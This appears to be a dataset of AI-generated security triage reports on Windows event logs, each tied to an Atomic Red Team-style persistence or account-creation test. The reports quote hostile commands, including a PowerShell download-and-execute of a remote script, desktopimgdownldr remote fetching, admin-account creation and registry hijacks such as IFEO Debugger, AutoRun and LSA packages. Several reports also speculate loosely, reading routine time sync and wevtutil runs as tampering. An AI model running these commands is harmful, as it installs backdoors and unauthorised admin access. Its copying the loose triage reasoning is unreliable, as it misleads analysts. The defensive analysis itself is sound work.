COM Hijacking with RunDLL32 (Local Server Switch),"### Analysis of the Logs

#### Sysmon Log Analysis

1. **PowerShell Execution**:
   - **Time**: 2024-10-27 14:55:55
   - **Process**: `powershell.exe`
   - **User**: `SERVER002\admin_test`
   - **Command**: This PowerShell script creates a new registry key, specifies an InprocServer32 path pointing to a DLL in a suspicious temp directory, and subsequently launches `RUNDLL32.EXE` using this key. This behavior suggests potential attempts at persistence or execution of a malicious DLL via COM hijacking.

2. **Conhost and Event Utilization**:
   - Frequent instances of `conhost.exe` and `wevtutil.exe` executing. While these processes can be benign, their appearance alongside the suspicious PowerShell activity is atypical and potentially part of obfuscation or logging tampering strategy.

3. **Hostname Execution**:
   - Executing `hostname.exe` is unusual in a sequence following `PowerShell` execution and DLL registration manipulations without user interaction suggesting automated or scripted activity potentially used for environment discovery.

4. **Wevtutil and Frequent Process Creation**:
   - Rapid creation of processes (`wevtutil.exe`, `conhost.exe`) may indicate tampering or modification attempts on the event logging services.

5. **DLL Manipulation**:
   - Reference to a DLL path in ""Externalfiles\calc.dll"" through registry keys indicates this might be a malicious DLL run via COM server manipulation.

#### PowerShell Log Analysis

The PowerShell log indicates a script was run which matches the command line found in the Sysmon logs. The script performs modifications to registry keys, specifically setting an application to be run through COM when a specific interface is requested.

#### Application Log

1. **Edge Update Activity**:
   - Multiple legitimate updates or `MicrosoftEdgeUpdate` service actions are evident, aligned with typical software update patterns. However, this activity interspersed with the PowerShell and process creation suspicious behavior signals a need for careful scrutiny, but on its own isn't necessarily malicious.

### Assessment and Findings

- **Key Indicators**:
  - Suspicious use of PowerShell for registry modifications and shell execution.
  - Creation of suspicious registry keys, suggesting potential persistence mechanisms.
  - DLL execution via `rundll32.exe` implying possible malicious payload or persistence attempt.
  
- **Risks Identified**:
  - Potential malware or adversarial persistence through PowerShell scripting and registry modifications.
  - Possible evasion or logging alteration attempts given `wevtutil.exe` invocations.

### Conclusion

Given the sequence of unusual PowerShell activity, registry modification for COM hijacking, and execution of processes typically associated with persistence and logging manipulation, the logs contain evidence of suspicious activity but lack definitive proof of compromise like known malware signatures without further forensic investigation.

### Resolution

- **SUSPICIOUS**: Further investigation required to determine if the DLL or other scripts executed are benign or part of a targeted attack. Specifically, examine the contents or changes of the `.dll` files, assess registry changes, and verify all associated user actions."
IFEO Global Flags,"Upon reviewing the provided logs, several observations and analyses are outlined below to determine the resolution.

### Observations:

1. **System Logs and Time Adjustments:**
   - Time changes are logged, involving Microsoft's `svchost.exe` to sync time with `time.windows.com`. This operation appears normal as time synchronization is a standard routine action by Windows Time Service.

2. **Security Logs:**
   - Events indicate the time was set by the `svchost.exe` process. The user associated is `LOCAL SERVICE`, which is standard for such services.

3. **Application Logs:**
   - The `edgeupdate` service stopped multiple times. This behavior is typically related to routine updates and background processes for Microsoft Edge.

4. **Sysmon Logs:**
   - There are multiple logs of processes related to Microsoft Edge, including `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe`, `MicrosoftEdgeUpdate.exe`, and other binaries associated with Edge updates.
   - Execution of `cmd.exe` with a command to modify registry settings related to `notepad.exe`:
     - The command line modifies registry keys:
       - `Image File Execution Options` for `notepad.exe` setting `GlobalFlag`.
       - Configuring `SilentProcessExit` for `notepad.exe` proposing that it triggers `cmd.exe` upon silent exit.
     - This specific registry modification pattern is suspicious and could be an indicator of a persistence mechanism or unauthorized modifications, often seen in malicious activities.

### Analysis and Risk:

- The regular time sync, security, and update activities for Microsoft Edge appear BENIGN.
- The command executed by CMD to add registry keys for `notepad.exe` is highly SUSPECT. This unusual modification suggests potential for evasive tactics or process injection normally used by attackers to intercept or unduly control application executions.

### Resolution:
- **Assessment:** The registry modifications and the use of `cmd.exe` to manipulate `notepad.exe` configurations are unusual and do not align with typical benign behavior on a CEO’s machine.
- **Threat/Risk:** There is a potential risk of system compromise or the presence of undetected malware.
- **Guidance:** This activity requires further investigation into the source and authenticity of the command execution. This involves:
  - Checking user activity logs and peripheral devices for unauthorized access.
  - Reviewing scheduled tasks or startup scripts for additional signs of persistence.
  - Conducting a malware scan focused on identifying suspicious registry changes or related signatures.

**Final Resolution:** **SUSPICIOUS** - The logs contain activities that raise concerns and necessitate further investigative action."
Bits download using desktopimgdownldr.exe (cmd),"Upon reviewing the provided event logs, several observations have been made related to potential suspicious behavior:

### Notable Observations:
1. **Command Execution:**
   - The command `cmd.exe /c set ""SYSTEMROOT=C:\Windows\Temp"" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/file/file-file/master/files/data/data.md /eventName:desktopimgdownldr` is executed, which alters the `SYSTEMROOT` and involves downloading a file from a remote URL. This behavior is commonly seen in unauthorized activities where scripts or tools are downloaded and executed.

2. **Use of Desktop Image Downloader:**
   - The execution of `desktopimgdownldr.exe` with parameters that involve retrieving files from a URL is suspicious. This can indicate an attempt to download and execute potentially harmful files or perform unauthorized background tasks.

3. **Image and PowerShell Executions:**
   - The execution of system utilities like `wevtutil.exe` and `conhost.exe` are frequently observed, without any explicit indications of troubleshooting or legitimate administrative tasks. If not typically used by the user or correlating with known maintenance activities, this may indicate misuse or manipulation.

4. **Edge Updates as Cover Activity:**
   - Multiple `MicrosoftEdgeUpdate.exe` processes are observed. While these can relate to legitimate update processes, their frequency and correlation with other suspicious activities is notable. Potential misuse can occur where legitimate processes are mimicked or utilized to obfuscate nefarious activities.

5. **Integrity Level and User Context:**
   - All actions are executed under the context of `SERVER002\admin_test` with high integrity levels, suggesting elevated permissions are being used. Unauthorized usage of an admin account or elevated privileges could indicate attempts at privilege escalation or unauthorized access.

### Threat Assessment:
- **Suspicious Command Execution:** Altering system paths (e.g., `SYSTEMROOT`) and leveraging external connections to publicly accessible URLs are indicators of potential malicious intent or configuration changes that should not be typical.
- **Combination with Known Software:** Utilizing `desktopimgdownldr.exe` in non-standard ways suggests exploitation of existing system utilities.

### Resolution:
**SUSPICIOUS** - The activity outlined above requires further investigation. While there are legitimate applications (like Microsoft Edge updates and hostnames) visible, the combination of these events raises enough concern to recommend a thorough review.

### Guidance on Next Steps:
1. **Verify User Actions:** Confirm with the user (particularly admin accounts) whether these command executions and downloads were initiated legitimately.
2. **Network Traffic Analysis:** Investigate network logs to trace any unusual outbound connections to the flagged URLs or unexpected data flows.
3. **Endpoint Analysis:** Conduct a deeper review of the host for any unauthorized software installations, scripts, or potential malware.
4. **Enhance Monitoring:** Deploy additional endpoint and network monitoring for anomalous activities and configure alerts for similar command executions.

The logs reflect certain activities that warrant concern and should be approached as potentially malicious until further clarity is obtained through a detailed investigation."
Set Arbitrary Binary as Screensaver,"Upon analyzing the provided Windows event logs, several observations can be made:

1. **Edge Update Activity**: There are multiple instances of `MicrosoftEdgeUpdateComRegisterShell64.exe` and `MicrosoftEdgeUpdate.exe` processes running. These processes are associated with Microsoft's Edge browser update mechanism and are legitimate system operations.

2. **Unauthorized Registry Modifications**: There's a series of events related to `reg.exe` and `cmd.exe`, indicating modifications to the Windows registry. The command attempts to modify screensaver settings to use a file `evilscreensaver.scr`, which appears to be created by copying `cmd.exe` to a screensaver file path. Such actions suggest a potential compromise, as legitimate system processes rarely modify screensaver settings to point to executable files, especially named in such a suspicious manner.

3. **Unusual Commands and Redirections**: A complex command-line issued by `cmd.exe` attempts to export current registry settings, copy an instance of `cmd.exe` and modify registry keys related to screensaver settings. This includes setting `\\System32\\evilscreensaver.scr` as the screensaver path. These changes can indicate an effort to establish persistence by leveraging a screensaver execution technique, which is a known method used by attackers to execute arbitrary code under the guise of a screensaver.

4. **Privilege Escalation**: The logs show an event (ID 4672) where special privileges are assigned to the `admin_test` user, which includes `SeDebugPrivilege`, `SeBackupPrivilege`, etc. While this could be part of normal operations, in the context of the registry modifications and other suspicious activities, it raises concerns about potential privilege escalation by an attacker.

5. **Other Utilities**: The use of tools like `whoami.exe`, `reg.exe`, and `conhost.exe`, especially in the sequence observed, often accompanies malicious activity to assess user permissions, modify system configurations, and handle command executions.

### Threat Assessment

- **Malicious Intent Detected**: The command-line involving `cmd.exe` with `reg.exe` to manipulate registry settings, particularly for a screensaver, and the use of an executable file with a potentially malicious name (`evilscreensaver.scr`), strongly indicate unauthorized and potentially malicious activity. 

- **Risk Level**: High. The described sequence of actions fits the pattern of a deliberate attempt to maintain persistence or execute arbitrary malicious code on the system with elevated privileges.

### Recommended Actions

1. **Immediate Investigation**: Conduct a detailed forensic analysis on `Server002` to see if the malicious screensaver file (`evilscreensaver.scr`) exists and remove it if found.

2. **Confirm State & Integrity**: Verify the current state and integrity of the registry, especially the keys related to screensaver configurations.

3. **Audit Accounts and Privileges**: Review and audit user account activities, particularly those of `admin_test`, and any unnecessary privileges or anomalies.

4. **Review and Monitor**: Implement stricter monitoring for changes to the registry and privilege escalation attempts, and review security policies to prevent unauthorized modifications.

5. **Incident Response**: Engage the Incident Response team to evaluate potential data exfiltration and other compromises, and ensure the system is secured and patched against future attacks.

**Final Resolution: MALICIOUS** – The logs contain activity that is clearly malicious in nature, with evidence of unauthorized registry modifications indicative of potential compromise."
Persistence using automatic execution of custom DLL during RDP session,"### Detailed Analysis of the Logs

Upon reviewing the provided Windows event logs, several events exhibit potentially suspicious behavior, which merit further investigation. Here's a breakdown of the findings:

1. **Security Log:**
   - **Events 4624 and 4672**: These events reflect logon attempts and the assignment of special privileges. The user ""admin_test"" logs in with various privileges, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeLoadDriverPrivilege`. The presence of `SeDebugPrivilege` particularly can be troubling as it allows the user to debug processes, which can be exploited by malicious actors to escalate privileges or inject code.
   - **Event 4634**: Indicates a logoff event. The timing and frequency of the login and logoff events within a very short period could indicate scripted or automated actions, which is unusual for a legitimate user session.

2. **System Log:**
   - **Time Sync and Kernel-General Events (Events 24 and 1)**: These events show the system time being adjusted. While this could be benign, time manipulation can be used to evade detection systems that rely on timestamps, suggesting a possibility of an attempt to obscure malicious activity.

3. **Sysmon Log:**
   - **Multiple Executions of Utilities (Events 5 and 1)**: Multiple instances of `wevtutil.exe`, `cmd.exe`, `reg.exe`, `conhost.exe`, and `whoami.exe` being executed by the user ""admin_test"" within a brief timeframe. The execution of these utilities might be associated with administrative tasks, but in this context, `cmd.exe` was used to modify the registry (`HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\AddIns\TestDVCPlugin`). The command involves `amsi.dll`, typically related to Antimalware Scan Interface, which, if modified, could be a sign of an attempt to disable or bypass local security features.
   - **Registry Modification with `reg.exe`**: The command executed (`reg add ...` modifying the `TestDVCPlugin`) echoes classic techniques of persistence or exploitation through registry modification. This action could potentially enable malicious code execution during remote sessions.

4. **Application Log:**
   - Slightly lacking in context as minimal relevant activity is logged. However, the presence of Software Protection Platform Service logs generally aligns with regular operations of Windows for its licensing checks.

### Assessment and Conclusion

- **Risk and Threats Identified**: The aggregation of these activities—especially privilege escalation granting potentially exploitable privileges, time manipulation, and registry modifications associated with a critical system component—strongly suggests malicious intent or a configuration drift leading to potential security issues. This pattern is consistent with how certain sophisticated attacks operate, maintaining persistence and gaining elevated privileges on a host.
  
- **Resolution**: **MALICIOUS**

### Guidance on How to Proceed

1. **Immediate Monitoring and Containment:**
   - Isolate the affected system to prevent potential lateral movement.
   - Monitor for any outgoing connections that may suggest data exfiltration or external command and control.

2. **Further Investigation:**
   - Perform a full security assessment of the system focusing on new, changed, or deleted files.
   - Review privilege assignments and policies.
   - Check for additional registry keys related or newly created since the time of events.

3. **Remediation:**
   - Restore modified or suspect registry entries to their default secure values.
   - Revoke unnecessary elevated privileges unless explicitly justified by business needs.
   - Implement more robust monitoring to capture and alert on similar activity in real time.

4. **Reporting and Documentation:**
   - Document activities and findings thoroughly for organizational awareness and necessary compliance requirements.
   - Engage with incident response teams to conduct a deeper forensic analysis and root cause investigation. 

This analysis indicates a strong likelihood of compromised activities and should be addressed as per incident response protocols."
Create a new Windows admin user via .NET,"After a thorough analysis of the provided logs, several indicators of potential malicious activity have been identified.

1. **PowerShell Activity**: There are multiple instances where PowerShell is executed with the download and execution of a script from the URL `https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1`. This script appears to be attempting to create a new local admin account, which is a strong indicator of potentially malicious activity. The use of `iex(new-object net.webclient).downloadstring(...)` is a technique often used by attackers to fetch and execute scripts remotely.

2. **Creation and Manipulation of Local User Accounts**: In the security logs, there is evidence of a user creation event (Event ID 4720), specifically for a user named `NewLocalUser`, followed by enabling the account (Event ID 4722) and adding it to the Local Administrators group (Event ID 4732). This series of events suggests an attempt to establish persistence on the machine by creating a new administrative account.

3. **System Time Manipulation**: The system and security logs indicate that the system time was altered (Event ID 4616). While changes in system time can happen during normal operations (e.g., by an NTP sync), they can also be a tactic used post-compromise to manipulate time-stamps for logs or scheduled task execution.

4. **Privilege Escalation and Lateral Movement Attempts**: The account named `admin_test` is seen to have used high privileges (Event ID 4672), which suggests it may be exploited for privilege escalation or lateral movement activities.

5. **EDR Alert on CEO’s machine**: The alert originated from suspicious behavior on the CEO's computer, which aligns with the activity noted. Any unauthorized or anomalous actions on a high-profile system such as this should be treated with caution.

These activities are closely associated with malicious intent, particularly oriented towards establishing unauthorized administrative access and potentially maintaining persistence on the system. It is highly recommended to:

- Investigate the origin of the PowerShell commands, especially the downloading and execution of external scripts.
- Review the system for any new administrative accounts, particularly `NewLocalUser`, and verify their legitimacy.
- Inspect network logs to check for other systems that might have been accessed using these new credentials.
- Ensure patches and updates are installed for all essential software to mitigate any exploited vulnerabilities.
- Conduct a full system scan using up-to-date antivirus or endpoint detection and response (EDR) tools.

As the analysis shows clear signs of unauthorized activities indicative of system compromise through account creation, privilege abuse, and potential persistence mechanisms:

**Resolution: MALICIOUS** - Immediate incident response actions are necessary to contain and remediate the threat."
Create a new Windows admin user,"### Detailed Analysis:

Upon reviewing the logs provided for the Windows host (Server002), the following findings and analysis are presented:

#### Suspicious or Anomalous Behaviors:
1. **User Account Creation and Privilege Escalation:**
   - Multiple commands (`cmd.exe`, `net.exe`, `net1.exe`) were executed to create a new user account named `data.001_Admin` and add it to the administrators group.
   - The command used: `""cmd.exe"" /c net user /add ""data.001_Admin"" ""data_pass"" & net localgroup administrators ""data.001_Admin"" /add`.
   - This activity was initiated by `admin_test`, a user account on `SERVER002`. The use of such commands to create and elevate user privileges is a significant indicator of potential malicious activity.
   
2. **Process Creation and Execution:**
   - Sysmon logs showed the execution of `wevtutil.exe` and `conhost.exe` repeatedly, indicating an underlying script or automation process, potentially hidden from regular user observance.
   - The execution of `cmd.exe` and subsequent system-level binaries (`net.exe`, `net1.exe`) with elevated privileges under `admin_test` further solidify the suspicion of automated, unauthorized alterations to user accounts.

3. **Security Event Logs:**
   - Security Event ID 4720 logs the creation of a new user account (`data.001_Admin`).
   - Event ID 4732 indicates adding this newly created account to the `Administrators` group.
   - These changes coincide time-wise and are executed under a high-integrity security context (`High` integrity level), which is indicative of potential compromise.

4. **High Privilege Operations:**
   - The use of `whoami.exe` and `hostname.exe` could be part of reconnaissance commands to understand the computer environment, particularly who is logged in and what naming conventions are used.

#### Indicators of Malicious Activities:
- The operation of creating and escalating user privileges without authorization is a common hallmark of compromise aiming for persistence and privilege escalation.
- The sequence of command execution and the rapid creation and modification of user accounts suggest scripted or automated delivery, common in credential theft or system takeover scenarios.

### Risks Identified:
- Unauthorized access to sensitive data: The creation of an admin-level user account enables access to sensitive information and settings.
- Potential wider network compromise: With administrative access on one node, lateral movement to other connected systems poses a high risk.
  
### Guidance and Next Steps:
- **Immediate Action:**
  1. Disable the `data.001_Admin` account immediately.
  2. Investigate and, if malicious, terminate any ongoing sessions associated with `admin_test` that show discrepancies or unauthorized activities.
  
- **Further Investigation:**
  1. Investigate how `admin_test` executed these commands and if this account has been compromised.
  2. Review any external connections or commands leading up to this event.
  3. Check for other anomalous behaviors across the enterprise that may suggest coordinated activity.

- **Long-term Actions:**
  1. Conduct a thorough review of system and audit logs across additional systems for similar patterns.
  2. Implement stricter monitoring and alerting for privilege escalation activities.
  3. Verify all accounts and privilege levels across the organization to ensure no further unauthorized changes.

### Resolution:
Based on the indications involving unauthorized account creation, privilege escalation, and the execution of potentially harmful commands:
- **Resolution: MALICIOUS** - The logs clearly indicate unauthorized and potentially harmful activities consistent with malicious intent.

Take the above-mentioned actions urgently to mitigate potential risks and reinforce security protocols."
Create a new Domain Account using PowerShell,"After analyzing the provided Windows event logs, I have identified several points of interest concerning potential malicious activity:

1. **PowerShell Execution**:
   - There are multiple instances of PowerShell being executed with a suspicious script that involves creating a new user account with specific credentials (`data.002_Admin` and `data_pass123!`). The script uses the `System.DirectoryServices.AccountManagement` assembly to manipulate user accounts. This behavior is highly unusual on a CEO's machine and indicates potentially unauthorized user and role creation or privilege escalation.
   - The PowerShell script is executed under the `SERVER002\admin_test` user account, which suggests that this account may have been compromised or is being misused.

2. **Process Spawning**:
   - Various processes, including `conhost.exe`, `whoami.exe`, and `wevtutil.exe`, are frequently launched by the `SERVER002\admin_test` user. While these are native Windows utilities, frequent spawning of such processes in quick succession could indicate an attempt to mask or facilitate unauthorized activity.
   - The use of `wevtutil.exe`, which is commonly used to manage event logs, suggests attempts to access or possibly alter logs, an action that attackers may take to cover their tracks.

3. **System Time Adjustments**:
   - The logs indicate time adjustments in the system time by `svchost.exe`, although these events alone do not explicitly imply malicious activity, they could be used to confuse time-related investigations or to synchronize with other planned activities.

4. **Network Service Execution**:
   - The `sppsvc.exe` (Software Protection Platform Service) process is seen running under the `NT AUTHORITY\NETWORK SERVICE` context. This is expected for `sppsvc.exe`, but given the overall context, it's crucial to ensure its legitimacy.

**Assessment**:
Based on the evidence of suspicious PowerShell activity that involves creating user accounts with specific privileges and the frequent spawning of system utilities under an administrative account, there is a strong indication of malicious behavior. Such activities are consistent with an account compromise or unauthorized administrative activities.

**Resolution**: **MALICIOUS**

**Guidance**:
- Immediately isolate the affected machine (Server002) to prevent further unauthorized access or spread.
- Conduct a full investigation of the `SERVER002\admin_test` user account to determine if it has been compromised.
- Review and reset account credentials, especially for accounts with administrative privileges.
- Analyze network traffic from the CEO's machine for any data exfiltration or external command and control communications.
- Evaluate other connected systems for similar PowerShell activities or suspicious account manipulations.
- Consider deploying enhanced monitoring on critical user accounts and systems."
Install Additional Authentication Packages,"Upon reviewing the logs provided, a detailed analysis reveals a mix of normal and potentially suspicious activities. Below is a breakdown of the findings:

### Detailed Analysis:

1. **Time Synchronization Events:**  
   The security logs contain several `EventID 4616` entries indicating time change events. This is typically benign and commonly associated with routine system time synchronization activities by network time protocols such as `time.windows.com`.

2. **Sysmon Log Observations:**
   - **PowerShell Execution:**
      - The series of `EventID 1` and `EventID 5` in the Sysmon log indicates the execution of `PowerShell.exe` by user `SERVER002\\admin_test`.
      - Notably, PowerShell is used to execute commands that modify the registry's LSA (Local Security Authority) Authentication Packages, and a DLL is copied to `C:\\Windows\\System32`. This action typically indicates attempts to introduce or manipulate authentication mechanisms, suggesting credential or security manipulation.

   - **Process Execution:**
      - The frequent creation of registry modifications and invocation of `wevtutil.exe` and `conhost.exe` processes are often observed during scripts that might involve log tampering or process management but aren't inherently malicious by themselves.
      - The use of legitimate Windows tools such as `whoami.exe` and `hostname.exe` might seem benign, but their frequent and clustered execution could suggest reconnaissance or validation checks during suspicious activity.

3. **Windows PowerShell Log Observations:**
   - **Scripts within PowerShell:** These perceive registry manipulation commands strongly resembling known techniques for persistence mechanisms and privilege escalation, such as:
     - Exporting registry keys.
     - Copying a potentially malicious DLL into a system directory.
     - Modifying the LSA Authentication Packages registry key to add custom authentication packages.

4. **Security and Application Log Observations:**
   - Normal operational logs referencing known system services such as `sppsvc.exe` and typical adjustments correlating with time and service checks.

### Assessment and Resolution:

- There are strong indications of potentially unauthorized or malicious activity mainly driven by the PowerShell command entries involved in registry modifications:
  - Attempting to modify LSA settings and introducing a DLL suggest efforts to establish persistence or escalate privileges.
  - Such patterns align with known tactics used in attacks for credential dumping or the introduction of unauthorized authentication backdoors.
  
- Given the context of PowerShell determining activity around registry and Direct Manipulation within the LSA policy, this presents a legitimate concern.

**Resolution: MALICIOUS**

### Recommendations:

- **Immediate Action:**
  - Isolate the affected host (Server002) from the network to prevent any potential spread of compromise.
  - Initiate a deeper forensic investigation on the host to confirm the presence of the DLL and analyze for any other indicators of compromise.
  
- **Containment Measures:**
  - Review user accounts and privileges, especially for `SERVER002\\admin_test`, to check for any unexpected changes or additions.
  - Analyze network logs for any abnormal or unauthorized communication outbound from Server002.

- **Further Recommendations:**
  - Apply security patches and review security configurations, especially around PowerShell execution policies.
  - Consider deploying enhanced monitoring for PowerShell scripts and registry changes within your network.
  - Educate users on identifying phishing or potential attack vectors that might lead to such unauthorized activities.

Based on the evidence within the logs, the behavior indicates malicious intent or compromise, primarily due to the registry manipulations performed by the PowerShell processes."
Azure AD - Create a new user via Azure CLI,"Upon analyzing the provided Windows event logs, several findings stand out:

### Indicators of Suspicious or Anomalous Behavior:
1. **PowerShell Activity**:
   - There are multiple entries in the PowerShell logs where a script is executed that includes commands to create a new Azure Active Directory (AD) user and list users with the same display name. The script is invoked via `powershell.exe` with specific login and user creation commands:
     ```plaintext
     powershell.exe & {az login
     $userprincipalname = ""file@yourdomain.com""
     $username = ""file"" 
     $password = ""reallylongcredential12345ART-ydsfghsdgfhsdgfhgsdhfg""
     az ad user create --display-name $username --password $password --user-principal-name $userprincipalname
     az ad user list --filter ""displayname eq 'file'""}
     ```

### Indicators of Malicious Activity or Compromise:
1. **Privileged PowerShell Execution**:
   - The commands in the PowerShell log suggest unauthorized creation of users in an Azure AD, leveraging administrator credentials (`$userprincipalname`, `$username`, and `$password`). This behavior is highly indicative of malicious activity, possibly an attempt to establish persistence or escalate privileges within the environment.

2. **Sysmon Logs and Process Activity**:
   - There is a process chain seen in Sysmon logs where `powershell.exe` is executed with administrative privileges (`IntegrityLevel: High`). This chain leads to the creation of a user account in Azure AD and user enumeration.
   - The presence of `wevtutil.exe` being used shortly after suspicious PowerShell activity might indicate attempts to clear or export event logs to cover tracks, which is a known tactic used by attackers.

3. **Use of High-Integrity Level Executables**:
   - Execution of various processes (`powershell.exe`, `whoami.exe`, `wevtutil.exe`) by the ""admin_test"" user with high integrity levels might indicate an attacker operating with escalated privileges.

### Assessment of the Situation:
The PowerShell commands detected in the logs, particularly the creation of an Azure AD user using administrative credentials, combined with the manipulation of logs using `wevtutil.exe`, are strong indicators of unauthorized and malicious activities. This suggests the possibility of an active compromise attempt aimed at user management and log evasion tactics.

### Threats or Risks Identified:
- Potential unauthorized access and persistence in Azure AD, allowing further network infiltration or data exfiltration.
- Presence of potentially compromised credentials.
- Indicators of an attempt to clean up evidence by manipulating logs.

### Guidance on How to Proceed:
1. **Immediate Containment**: Disable the credentials or account (`admin_test` or any account related to the suspicious PowerShell activity) to prevent further unauthorized access.
2. **Forensic Analysis**: Conduct a thorough review of user activity across the network, particularly focusing on Azure AD configurations and access logs.
3. **Credential Reset**: Enforce password reset for potentially affected accounts across the domain.
4. **Review of Security Policies**: Ensure that best practices for PowerShell and script execution policies are enforced (e.g., script block logging, constrained language mode).
5. **Monitoring and Detection Enhancement**: Strengthen monitoring of PowerShell activities and employ alerting for unusual execution patterns or high-integrity processes run by non-privileged accounts.

### Resolution:
After reviewing the logs and associated activities, the findings align with unauthorized and potentially harmful actions typically classified as malicious activities.

**Resolution: MALICIOUS**"
Modify Terminal Services DLL Path,"### Analysis of Event Logs:

Even logs from the CEO's machine reveal activities indicating potential malicious behavior:

1. **Security Log (EventID 4907):**
   - **Event:** Change in security permissions on `termsrv.dll`.
   - **Details:** Access control list (ACL) on `C:\Windows\System32\termsrv.dll` was modified using PowerShell, changing permissions across a critical system file.
   - **Interpretation:** It's abnormal and could indicate an attempt to backdoor or alter Terminal Services, impacting Remote Desktop services.

2. **Sysmon Log (EventID 1 and 5):**
   - **Events:** Execution of `powershell.exe` with a complex script affecting `termsrv.dll`.
   - **CommandLine Arguments:** Show attempts to:
     - Adjust ACL to grant Full Control to Administrators.
     - Copy `termsrv.dll` to user's directory.
     - Modify the registry for the Terminal Service's `ServiceDll` parameter.
   - **Interpretation:** This behavior is highly suspicious, mimicking a likely attack vector seeking persistence and capability to execute or modify service DLLs.

3. **Windows PowerShell Log (EventID 600 and 400):**
   - **Script Execution:** Detailing actions that match the suspicious behavior seen in logs from Sysmon.
   - **Activities:** Setting new access rules to `termsrv.dll` and modifying registry key for the `TermService`.
   - **Interpretation:** Execution of distinct PowerShell commands tailored to manipulate system services, particularly Terminal Services, which might aim at enabling or maintaining remote access for unsanctioned purposes.

### Assessment and Conclusion:

The activity observed is consistent with an unauthorized attempt to modify critical system files and registry settings, which directly impacts Remote Desktop Protocol services. These actions are aligned with techniques used by attackers for maintaining persistence and elevating privileges within a compromised environment.

### Resolution: **MALICIOUS**

- The logs clearly contain malicious activity.
- Recommend immediate isolation of the affected machine, comprehensive scans for any other malicious activities or persistence mechanisms, and a detailed forensic investigation to determine the full scope and impact.
- Review and reset access permissions on critical system files and monitor for unauthorized PowerShell script executions. Consider deploying stricter access controls and logging configurations.

- Engage with incident response teams to ensure eradication of potential threats and setup preventive measures to avoid future incidents."
IFEO Add Debugger,"Based on the provided logs, let's examine the activities observed for any signs of suspicious or malicious behavior.

### Detailed Analysis

#### Application Log:
- Multiple logs showing the `edgeupdate` service stopped. This could be normal behavior related to the updating process of Microsoft Edge.

#### Sysmon Log:
- There's a series of informative logs without immediate evidence of any unusual processes initiating or terminating unexpectedly.
- A majority of the logs relate to normal system operations like the `MicrosoftEdgeUpdate.exe`, which correlate with the entries in the application log about service stops. The installation and update processes for Microsoft Edge are consistent and expected processes.
- **Suspicious Activity**: `cmd.exe` is run with a command to modify the registry path: `""HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\calc.exe"" /v Debugger /d ""C:\\Windows\\System32\\cmd.exe""`. This behavior is suspicious as it suggests a debugger attack to hijack the execution of `calc.exe`, which may be indicative of an attempt to bypass security via Image File Execution Options (IFEO) tampering, a technique often used for malicious purposes.
- `whoami.exe`, `hostname.exe`, and various `edgeupdate` processes run under `NT AUTHORITY\SYSTEM` which is standard, but seeing `cmd.exe` being used in conjunction with registry edits is unusual and a red flag.

#### System and Security Logs:
- System log entries are regular timezone and time change entries; No direct incident or compromise indicators.
- Security log entries show normal auditing events related to time changes associated with `svchost.exe`.

### Assessment and Conclusion
The logs display predominantly benign behavior but flag one particularly suspicious event involving a registry modification using `cmd.exe`, which aligns with tactics seen in malware activities to hijack executable execution via IFEO keys. This warrants further investigation to assess whether this action aligns with any authorized administrative task or if it was malicious in intent.

### Final Resolution
- **SUSPICIOUS**: The presence of registry modifications through `cmd.exe` related to the `Image File Execution Options` is unusual and requires further investigation to verify the user's intentions and whether this aligns with legitimate administrative actions or indicates potential compromise.

### Recommended Next Steps
1. **Investigate the Source**: Verify recent tasks or scripts run by `admin_test`. Check if interfered processes like `calc.exe` are behaving abnormally.
2. **User Validation**: Validate with the user/admin (`SERVER002\admin_test`) regarding the registry modification’s intent and necessity.
3. **Monitor for Further Activity**: Keep a closer eye on this machine for similar suspicious activities or further registry changes.
4. **Review Security Policies**: Check and enforce proper endpoint protection policies to detect and alert on such registry alterations.
"
HKCU - Persistence using CommandProcessor AutoRun key (Without Elevation),"Upon reviewing the provided logs, several observations and analyses can be made:

### Suspicious and Anomalous Activity:
1. **PowerShell Execution**:
   - A suspicious PowerShell command was executed as seen in the Sysmon and PowerShell logs. The command modifies the Windows registry to set an AutoRun value within the Command Processor key:
     ```
     & {$path = ""HKCU:\Software\Microsoft\Command Processor""
     if (!(Test-Path -path $path)){ New-Item -ItemType Key -Path $path }
     New-ItemProperty -Path $path -Name ""AutoRun"" -Value ""notepad.exe"" -PropertyType ""String""}
     ```
   - This behavior is indicative of a persistence mechanism, which aims to run `notepad.exe` (or potentially another program masquerading as Notepad) automatically upon command processor (cmd.exe) start.

2. **High Integrity Level Execution**:
   - Multiple logged events indicate execution at a high integrity level by the user `SERVER002\admin_test`. Processes like `whoami.exe`, `hostname.exe`, and others were run from a path typically associated with a more privileged user (admin_test).

3. **Wevtutil Executions**:
   - Repeated execution of `wevtutil.exe`, which can be used to clear event logs, signifies potential cover-up activities after malicious actions.

4. **Unusual Parent-Child Relationships**:
   - The PowerShell command being executed without a typically expected parent process relationship indicates the potential for process tampering or hollowing activities.

### Potential Malicious Activities:
- **Persistence Mechanism**: The modification to the registry for an AutoRun entry exhibiting stealthy persistence is a red flag.
- **Executable Execution and logging modification**: The sequence of events in Process creation of `hostname.exe`, `conhost.exe`, `wevtutil.exe` indicates potential malware activities aligning with typical patterns of reconnaissance, execution, and clean-up.

### Threats and Risks Identified:
- Potential for persistence of unwanted software through registry modification.
- The likelihood of system compromise through scripts aimed at hiding other malicious activities.
- Elevated risk due to the use of a high-privileged account (admin_test) for executing these tasks.

### Guidance on How to Proceed:
1. **Immediate Mitigation**:
   - Inspect the registry key HKCU:\Software\Microsoft\Command Processor for unauthorized AutoRun settings.
   - Revert any unauthorized changes and delete suspicious AutoRun entries.

2. **Review Account Privileges**:
   - Audit the `admin_test` account for unauthorized access and ensure password rotation and security policies are enforced.

3. **Collect Forensics**:
   - Take a snapshot of the system state, registry, and file integrity for offline analysis by a forensic team.
   - Inspect other machines on the network for similar behaviors to isolate any propagation.

4. **Enhance Monitoring**:
   - Implement tighter monitoring on PowerShell executions, and enable command line logging to detect and alert similar patterns in real-time.

5. **Security Incident Response**:
   - Based on findings, trigger the appropriate incident response plan, potentially involving full isolation of the compromised host from the network.

### Conclusion:
Final Assessment: **MALICIOUS**

